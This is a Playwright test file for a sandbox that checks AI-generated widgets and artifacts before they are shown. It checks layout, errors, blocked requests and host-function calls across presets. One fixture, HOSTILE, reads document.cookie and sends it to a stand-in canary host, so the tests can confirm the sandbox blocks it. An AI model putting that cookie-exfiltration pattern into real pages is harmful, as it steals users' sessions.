import { expect, test } from "@playwright/test";
import { cdpDriver, checkPage, playwrightDriver } from "../src/check/index.ts";
import {
  CAPABILITY_NAMES,
  GUIDE_EXAMPLES,
  presets,
  type CapabilityMap,
  type PortholeConfig,
} from "../src/index.ts";

/**
 * The agent's pre-show check (P073) in real browsers: the manual's own examples pass it under
 * every preset, at the manual's widths, in light and dark (OBJECTIVES criterion 5); a page that
 * breaks is told so, briefly; the CDP driver (Cloudflare Browser Rendering's way) works too.
 */

/** Every host function declared: each served by the check's declining handlers (P074). */
const EVERY: CapabilityMap = Object.fromEntries(CAPABILITY_NAMES.map((name) => [name, {}]));
const SERVED = {
  isolation: "domain",
  contentOrigins: ["https://*.example-usercontent.com"],
} as const;

const PRESETS: Record<string, PortholeConfig> = {
  inlineWidget: presets.inlineWidget(),
  "inlineWidget, every host function": presets.inlineWidget({ capabilities: EVERY }),
  "inlineWidget, served, every host function": presets.inlineWidget({
    ...SERVED,
    capabilities: EVERY,
  }),
  artifact: presets.artifact(),
  "artifact, served, every host function": presets.artifact({ ...SERVED, capabilities: EVERY }),
  "artifact, a whole-page viewer": presets.artifact({
    layout: { kind: "fill" },
    theme: { documents: "never" },
  }),
  mcpApp: presets.mcpApp(),
  "mcpApp, every host function": presets.mcpApp({ capabilities: EVERY }),
};

const asDocument = (body: string) =>
  `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Example</title></head><body>${body}</body></html>`;

for (const [preset, config] of Object.entries(PRESETS)) {
  test(`every example in the manual passes the check under ${preset}`, async ({ browser }) => {
    test.setTimeout(120_000);
    for (const [name, example] of Object.entries(GUIDE_EXAMPLES)) {
      const report = await checkPage({
        config,
        content: config.mode === "inline" ? example : asDocument(example),
        driver: playwrightDriver(browser),
        settleMs: 700,
      });
      expect(report.ok, `${name}:\n${report.text}`).toBe(true);
      expect(report.runs.length).toBe(config.theme.documents === "never" ? 2 : 4);
      expect(report.runs.every((run) => run.height !== null && run.height > 0)).toBe(true);
    }
  });
}

const BROKEN = [
  "<style>.wide { width: 900px }</style><div class=wide>wide</div>",
  '<img src="https://porthole-canary.example/x.png">',
  "<script>console.error('it broke'); null.x;</script>",
  "<script>Promise.reject(new Error('rejected'))</script>",
].join("\n");

test("a widget that breaks is told what broke, at each width and scheme, in a few lines", async ({
  browser,
  browserName,
}) => {
  const report = await checkPage({
    config: presets.inlineWidget(),
    content: BROKEN,
    driver: playwrightDriver(browser),
    settleMs: 800,
  });
  expect(report.ok).toBe(false);
  const run = report.runs.find((each) => each.width === 750 && each.scheme === "dark");
  // WebKit mutes a thrown error's message in an opaque frame ("Script error."): run the check on
  // Chromium for its words (ADOPTING.md).
  expect(run?.errors.join("\n")).toMatch(browserName === "webkit" ? /null|Script error/u : /null/u);
  expect(run?.errors.join("\n")).toContain("rejected");
  expect(run?.blocked).toContainEqual({
    url: "https://porthole-canary.example/x.png",
    directive: "img-src",
  });
  expect(run?.console.map((each) => each.text)).toContain("it broke");
  expect(run?.overflowX).toBe(true);
  // Each problem once, with where it happened.
  expect(report.text.split("\n").length).toBeLessThanOrEqual(10);
  expect(report.text).toContain(
    "The sandbox blocked https://porthole-canary.example/x.png (img-src)",
  );
  expect(report.text).not.toContain("Failed to load https://porthole-canary.example/x.png");
  const capped = await checkPage({
    config: presets.inlineWidget(),
    content: BROKEN,
    driver: playwrightDriver(browser),
    settleMs: 800,
    maxProblems: 2,
  });
  expect(capped.text).toMatch(/- and \d+ more\.$/u);
});

test("the CDP driver runs the check over a DevTools session (Cloudflare Browser Rendering's way)", async ({
  browser,
  browserName,
}) => {
  test.skip(browserName !== "chromium", "CDP is Chromium's protocol");
  const page = await browser.newPage();
  try {
    const report = await checkPage({
      config: presets.artifact(),
      content: asDocument("<p>A page</p><script>throw new Error('over CDP')</script>"),
      driver: cdpDriver(() => page.context().newCDPSession(page)),
      settleMs: 700,
      screenshots: true,
    });
    expect(report.ok).toBe(false);
    expect(report.text).toContain("It threw: Error: over CDP");
    expect(report.runs[0]?.screenshot?.byteLength).toBeGreaterThan(100);
  } finally {
    await page.close();
  }
});

const HOSTILE = `<!doctype html>
<html><head><title>Hostile</title></head>
<body>
<p>A page that reads its cookie, then calls out</p>
<script>
const seen = document.cookie;
fetch("https://porthole-canary.example/x?c=" + seen);
localStorage.setItem("kept", "1");
null.boom;
</script>
</body></html>`;

test("a served config is checked served: its own origin, cookie and storage as people's browsers give them (P074)", async ({
  browser,
  browserName,
}) => {
  const served = presets.artifact({
    isolation: "domain",
    contentOrigins: ["https://*.example-usercontent.com"],
  });
  const report = await checkPage({
    config: served,
    content: HOSTILE,
    driver: playwrightDriver(browser),
    settleMs: 800,
    widths: [400],
    schemes: ["light"],
  });
  const run = report.runs[0];
  // A served frame reads its cookie ("") and goes on: the fetch is what's blocked.
  expect(run?.errors.join("\n")).not.toContain("SecurityError");
  expect(run?.blocked).toContainEqual({
    url: "https://porthole-canary.example/x?c=",
    directive: "connect-src",
  });
  // Lines as written in the content, as the lint counts them. Each engine words the error its
  // own way, and WebKit names no script in its errors (Chromium is the check's best engine).
  expect(run?.errors).toContainEqual(
    browserName === "chromium"
      ? "TypeError: Cannot read properties of null (reading 'boom') (line 9)"
      : browserName === "firefox"
        ? 'TypeError: can\'t access property "boom" of null (line 9)'
        : expect.stringMatching(/^TypeError: null is not an object \(evaluating 'null\.boom'\)/u),
  );
  expect(report.lint.find((each) => each.rule === "egress")?.line).toBe(7);
});

/** Calls on load: two that need a click (refused), one a person declines, one a handler answers. */
const CALLS = `<p>Asks on load</p>
<button onclick="sendPrompt('on click')">Ask</button>
<script>
sendPrompt("on load").then((sent) => { document.title = String(sent); });
const ask = (id, method, params) => parent.postMessage({ jsonrpc: "2.0", id, method, params }, "*");
ask(901, "resources/read", { uri: "ui://data/x" });
ask(902, "tools/call", { name: "x", arguments: {} });
ask(903, "ui/download-file", { contents: [{ type: "resource", resource: { uri: "file:///a.txt", text: "a" } }] });
</script>`;

for (const [mode, extra] of [
  ["opaque", {}],
  ["served", SERVED],
] as const) {
  test(`a widget with every host function runs in the check, ${mode}, its calls answered as a declining host would (P074)`, async ({
    browser,
  }) => {
    const config = presets.inlineWidget({ ...extra, capabilities: EVERY });
    const report = await checkPage({
      config,
      content: CALLS,
      driver: playwrightDriver(browser),
      settleMs: 800,
      widths: [400],
      schemes: ["light"],
    });
    const run = report.runs[0];
    // A call on load that needs a click is refused: sendPrompt by the shell itself where the
    // frame knows it had no gesture (it rejects), else by the host; nobody clicks in a check, in
    // any engine (P078).
    const shellRefused = /^Unhandled rejection: sendPrompt needs a click/u;
    expect(run?.errors.filter((each) => !shellRefused.test(each))).toEqual([]);
    expect(
      run?.errors.some((each) => shellRefused.test(each)) ||
        run?.calls.some(
          (each) => each.capability === "sendPrompt" && each.outcome === "no-user-activation",
        ),
      "sendPrompt on load refused",
    ).toBe(true);
    expect(run?.calls).toEqual(
      expect.arrayContaining([
        { capability: "readData", outcome: "answered" },
        { capability: "callTool", outcome: "declined" },
        { capability: "downloadFile", outcome: "no-user-activation" },
      ]),
    );
    expect(report.ok).toBe(false);
    expect(report.text).toContain(
      "It called downloadFile at load, with no click: hosts refuse that. Call downloadFile from a click",
    );
    expect(report.text).toContain("Note: it called callTool at load; the check answered no");
    expect(report.text).toContain("Note: it called readData at load; the check answered no");
    // Calls a person may decline are notes, not problems.
    const quiet = await checkPage({
      config,
      content: `<button onclick="sendPrompt('hi')">Ask</button>`,
      driver: playwrightDriver(browser),
      settleMs: 500,
      widths: [400],
      schemes: ["light"],
    });
    expect(quiet.ok, quiet.text).toBe(true);
    expect(quiet.runs[0]?.calls).toEqual([]);
  });
}

test("the CDP driver checks a served config served too", async ({ browser, browserName }) => {
  test.skip(browserName !== "chromium", "CDP is Chromium's protocol");
  const page = await browser.newPage();
  try {
    const report = await checkPage({
      config: presets.inlineWidget({
        isolation: "domain",
        contentOrigins: ["https://*.example-usercontent.com"],
      }),
      content: "<p>w</p>\n<script>\nconst c = document.cookie;\nundefinedFn();\n</script>",
      driver: cdpDriver(() => page.context().newCDPSession(page)),
      settleMs: 700,
      widths: [300],
      schemes: ["dark"],
    });
    expect(report.runs[0]?.errors).toEqual([
      expect.stringMatching(/^ReferenceError: .*undefinedFn.* \(line 4\)$/u),
    ]);
  } finally {
    await page.close();
  }
});
